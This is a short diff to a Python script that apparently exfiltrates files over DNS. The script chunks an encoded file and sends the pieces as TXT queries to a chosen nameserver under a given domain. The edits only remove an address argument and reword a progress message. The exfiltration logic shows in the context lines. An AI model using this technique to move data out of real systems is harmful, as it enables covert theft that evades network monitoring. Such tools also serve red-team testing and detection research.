@@ -67,7 +67,7 @@ if __name__ == "__main__":
     #Send the header query
 
     #print("tcp:",args.tcp, "address:",address)
-    tcp_dns_record(args.nameserver,os.path.basename(args.file)+"|"+str(len(content_encoded))+"|"+hashedWord+"."+args.domain, dnslib.QTYPE.TXT,address,args.tcp)
+    tcp_dns_record(args.nameserver,os.path.basename(args.file)+"|"+str(len(content_encoded))+"|"+hashedWord+"."+args.domain, dnslib.QTYPE.TXT,args.tcp)
     
     count =0 
     #print (len(content_encoded))
@@ -76,7 +76,7 @@ if __name__ == "__main__":
         count +=len(chunk)
         chunk = chunk.decode('utf-8')
         #print(chunk, count)
-        progressBar(count, len(content_encoded), status="Sending file "+args.file+ " to "+address+":"+port)
+        progressBar(count, len(content_encoded), status="Sending file "+args.file+ " to "+args.nameserver+" for domain"+args.domain)
         
         r = tcp_dns_record(args.nameserver,hashedWord[:4]+chunk+"."+args.domain, dnslib.QTYPE.TXT,args.tcp)
         
